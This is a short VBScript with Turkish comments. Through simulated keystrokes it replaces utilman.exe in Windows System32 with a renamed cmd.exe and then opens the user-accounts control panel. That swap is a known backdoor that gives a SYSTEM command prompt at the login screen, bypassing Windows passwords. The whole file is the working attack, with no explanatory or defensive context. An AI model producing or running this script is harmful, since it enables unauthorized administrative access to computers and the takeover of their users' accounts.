Set WshShell = WScript.CreateObject("WScript.Shell")
' 5 saniye bekle, böylece pencereleri ayarlamak için yeterli zamanın olur.
WScript.Sleep 5000

' Komut istemini açar (Çalıştır penceresini açar ve cmd yazar)
WshShell.Run "cmd"
WScript.Sleep 1000

' Komutları sırayla girer
WshShell.SendKeys "c:" & "{ENTER}"
WScript.Sleep 500
WshShell.SendKeys "cd windows" & "{ENTER}"
WScript.Sleep 500
WshShell.SendKeys "cd system32" & "{ENTER}"
WScript.Sleep 500
WshShell.SendKeys "ren utilman.exe utilman1.exe" & "{ENTER}"
WScript.Sleep 500
WshShell.SendKeys "ren cmd.exe utilman.exe" & "{ENTER}"
WScript.Sleep 500
WshShell.SendKeys "control userpasswords2" & "{ENTER}"
